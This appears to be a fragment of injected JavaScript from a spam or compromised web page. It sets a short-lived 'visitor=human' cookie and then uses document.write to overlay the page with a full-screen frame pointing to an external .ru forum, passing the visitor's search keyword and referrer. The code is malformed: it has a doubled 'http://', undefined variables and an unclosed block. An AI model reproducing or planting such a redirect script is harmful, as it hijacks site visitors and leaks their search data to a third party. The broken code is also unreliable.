var ws=new Date();
ws.setMinutes(10+ws.getMinutes());
document.cookie="visitor=human; path=/; expires="+ ws.toGMTString();
if (document.cookie.match(/visitor=human/gi)){
	document.write('<frameset rows="*,0" framespacing="0" border="0" frameborder="NO"><frame src="http://http://pikni.ru/forum/lfn1&keyword='+key+'&se_referrer='+ref+'" noresize="" scrolling="auto"></frameset>   ');